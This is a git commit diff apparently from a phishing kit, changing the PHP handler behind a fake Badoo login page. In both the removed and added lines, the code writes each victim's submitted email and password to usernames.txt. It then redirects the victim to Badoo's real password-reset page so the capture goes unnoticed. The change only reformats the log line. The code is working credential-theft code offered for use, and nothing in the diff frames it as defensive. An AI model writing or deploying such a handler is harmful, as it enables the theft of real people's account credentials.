f91b39531dd116bee2478d150a16160f7c78e728
Tahmid Rayat <56682134+htr-tech@users.noreply.github.com>
2019-11-27 12:24:27 +0600

    Update login.php

--- websites/badoo/login.php
+++ websites/badoo/login.php
@@ -1,5 +1,5 @@
 <?php
 
-    file_put_contents("usernames.txt", "Badoo :- Username : " . $_POST['email'] . "  ||  Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+    file_put_contents("usernames.txt", "Username : " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://badoo.com/forgot/');
 exit();
